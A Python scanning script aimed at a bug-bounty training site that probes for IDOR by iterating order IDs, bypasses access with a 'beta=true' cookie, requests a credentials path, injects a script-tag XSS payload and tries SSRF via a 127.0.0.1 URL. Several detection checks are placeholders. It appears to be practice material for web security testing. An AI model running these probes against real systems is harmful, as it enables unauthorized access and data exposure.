import requests

TARGET_DOMAIN = 'https://www.bugbountytraining.com/fastfoodhackings/'
SESSION = requests.Session()

# Color Code

RED = '\033[91m'
PURPLE = '\033[95m'
GREEN = '\033[92m'
ENDC = '\033[0m'

# Banner

BANNER = PURPLE + """
 _    _ _ _             _    ______              _    _ _ _             
| |  | (_) |           | |  |  ____|            | |  | (_) |            
| |  | |_| |_ _   _  __| |  | |__ _ __ ___  __ _| |  | |_| |_ _   _ ___ 
| |  | | | __| | | |/ _` |  |  __| '__/ _ \/ _` | |  | | | __| | | / __|
| |__| | | |_| |_| | (_| |  | |  | | |  __/ (_| | |__| | | |_| |_| \__ \\
 \____/|_|\__|\__,_|\__,_|  | |  |_|  \___|\__,_|\____/|_|\__|\__,_|___/
                            | |                                         
                            |_|                                         
""" + ENDC
print(BANNER)

# Helper function to make a request and print the response
def make_request(url, method='GET', data=None, params=None, cookies=None, check_for_vuln=False):
    response = None
    if method == 'POST':
        response = SESSION.post(url, data=data, cookies=cookies)
    else:
        response = SESSION.get(url, params=params, cookies=cookies)

    print(PURPLE + f"Testing URL: {response.url}" + ENDC)
    if response.status_code == 200:
        print(f"Response: {response.text[:100]}")  # Print only first 100 chars
        if check_for_vuln and "vulnerability indicator" in response.text:  # Replace with actual indicator
            print(RED + "Potential Vulnerability Detected!" + ENDC)
        else:
            print(GREEN + "No obvious vulnerability detected with this request." + ENDC)
    else:
        print(RED + "Error or unusual response detected!" + ENDC)
    print("\n" + "-"*50 + "\n")

    return response

# Example modification for the IDOR function
def idor():
    url = f"{TARGET_DOMAIN}orders.php"
    # Attempt to access different order IDs
    for order_id in range(1, 10):  # Example range, adjust as necessary
        params = {'order_id': order_id}
        response = make_request(url, params=params)
        # Placeholder condition for detecting a vulnerability
        if "Order details for ID" in response.text:  # Replace with actual success indicator
            print(RED + f"Potential IDOR vulnerability detected with order_id={order_id}!" + ENDC)

# Test for Broken Access Control
def broken_access_control():
    url = f"{TARGET_DOMAIN}beta/index.php"
    cookies = {'beta': 'true'}
    make_request(url, cookies=cookies)

# Test for Information Disclosure
def info_disclosure():
    url = f"{TARGET_DOMAIN}loader.php"
    params = {'f': '/generate-credentials'}
    make_request(url, params=params)

# Test for Cross-Site Scripting (XSS)
def xss():
    url = f"{TARGET_DOMAIN}orders.php"
    params = {'order_id': '<script>alert("XSS")</script>'}
    make_request(url, params=params)

# Test for Server-Side Request Forgery (SSRF)
def ssrf():
    url = f"{TARGET_DOMAIN}loader.php"
    params = {'f': 'http://127.0.0.1/'}
    make_request(url, params=params)

def main():
    # Test for vulnerabilities
    print("Testing for IDOR...")
    idor()
    
    print("Testing for Broken Access Control...")
    broken_access_control()
    
    print("Testing for Information Disclosure...")
    info_disclosure()
    
    print("Testing for XSS...")
    xss()
    
    print("Testing for SSRF...")
    ssrf()

if __name__ == '__main__':
    main()
